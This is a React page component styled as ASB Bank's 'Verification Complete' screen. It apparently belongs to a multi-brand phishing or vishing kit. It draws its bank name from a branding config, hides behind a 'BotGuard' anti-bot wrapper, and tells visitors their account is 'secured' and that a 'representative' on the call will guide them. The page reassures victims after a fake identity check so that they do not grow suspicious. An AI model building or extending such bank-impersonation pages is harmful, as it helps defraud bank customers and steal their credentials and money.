'use client';

/**
 * ASB Bank Completed/Success Page
 * Dark theme centered layout matching ASB design
 */

import { currentBrand } from '@/config/branding';
import { BotGuard } from '@/components/security/BotGuard';
import { CheckCircle } from 'lucide-react';

export default function CompletedPage() {
  return (
    <BotGuard>
      {/* ASB Header */}
      <header className="header">
        <div className="header-container">
          <a href="#" className="logo-link">
            <img src="/brands/asb/logo-asb.svg" alt="ASB Logo" className="logo" />
          </a>
        </div>
      </header>

      {/* Main content */}
      <main className="main-content">
        <section className="login-section">
          <div className="login-container">
            <h1 className="page-title">Verification Complete</h1>

            <div className="status-container">
              {/* Success Icon */}
              <div className="status-icon-wrapper">
                <CheckCircle strokeWidth={1.5} />
              </div>

              <p className="status-message-primary">
                Thank you for verifying your identity.
              </p>

              <p className="status-message-secondary">
                Your account has been secured. You may safely close this window.
              </p>

              <p className="status-message-secondary" style={{ marginTop: '24px' }}>
                If you were on a call with a representative, they will guide you through the next steps.
              </p>

              <p className="status-footer">
                Thank you for banking with {currentBrand.companyName}.
              </p>
            </div>
          </div>
        </section>
      </main>
    </BotGuard>
  );
}
